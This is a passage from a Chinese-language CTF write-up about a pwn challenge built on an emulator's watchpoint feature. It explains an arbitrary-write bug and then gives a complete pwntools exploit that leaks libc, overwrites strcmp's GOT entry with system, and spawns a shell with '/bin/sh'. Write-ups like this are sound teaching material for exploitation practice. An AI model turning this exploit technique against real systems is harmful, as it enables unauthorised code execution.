    temp->next = NULL;
    return temp;
}

void set_watchpoint(char *args){
    bool flag = true;
  uint32_t val = expr(args, &flag);

  if (!flag) {
    printf("You input an invalid expression, failed to create watchpoint!");
    return ;
  }  

  WP *wp = new_wp();
  wp->old_val = val;
  memcpy(wp->exp, args, 30);
  //...
}

```

这里可以看到：

```
WP *wp = free_;
memcpy(wp->exp, args, 30);
```

也就是`w 0xdeedbeef`的时候，会把`0xdeedbeef`写入`free_+0x30`处

这样我们只需要去set free_再w就能实现任意写



这里的思路是写strcmp的got为system，在`ui_mainloop`中,strcmp的第一个参数就是我们输入的命令，输入binsh就行



exp:

这里我用的本地的libc

```py
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'
# address = './pwn_patched'
elf = ELF(address)
libc = elf.libc

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
# lg      = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("host.docker.internal",9999 )
elif len(sys.argv) > 1 and sys.argv[1] == "d":
    p = gdb.debug(address, gdbscript = gdbscript)
else:
    p = process(address)

def dbg():
    gdb.attach(p)
    # gdb.attach(p, gdbscript=gdbscript)
    # pause()

ru(b'(nemu) ')
# dbg()


#pwndbg> p/x 0x86a3fc8-0x6a3b80
#$1 = 0x8000448
sl(b'set 0x8000448 0x60eff0')

sl(b'info w')
ru(b'New Value')
ru(b'0x')
libc_low = int(p.recv(8),16)
ru(b'0x')
libc_high = int(p.recv(4),16)
lg("libc_high")
lg("libc_low")
libc_base = (libc_high<<32) | libc_low
libc_base = libc_base -0xadd30
lg("libc_base")
sl(b'set 0x8000448 0')
# dbg()

system = libc_base + 0x58750
strcmp_got = 0x60F0F0
# pwndbg> p &free_
# $1 = (WP **) 0x86a3fc0 <free_>
# pwndbg> p/x 0x86a3fc0 - 0x6a3b80
# $2 = 0x8000440
sl(b'set 0x8000440 0x60f0c0')
sl(b'w '+hex(system).encode())
sl(b'/bin/sh')


# 0x6a3b80
itr()
# x/8gx 0x60f018-0x20
```

> 做下来，有别于传统的题，又挺有意思的一道题

